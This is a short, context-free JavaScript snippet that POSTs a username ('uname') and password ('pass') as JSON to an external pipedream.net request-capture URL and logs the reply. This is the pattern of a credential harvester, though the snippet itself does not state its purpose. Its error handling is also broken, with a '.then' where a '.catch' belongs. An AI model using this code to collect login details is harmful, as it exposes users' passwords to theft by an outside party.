
fetch("https://enbz48za501af.x.pipedream.net",{
    method :'POST',
    body: JSON.stringify({
        name : uname,
        pass : pass,        
    }),
}).then(res=> {
       return res.text();
}).then (text=>{
    console.log(text);
}).then (function(error){
        console.error("error")
})

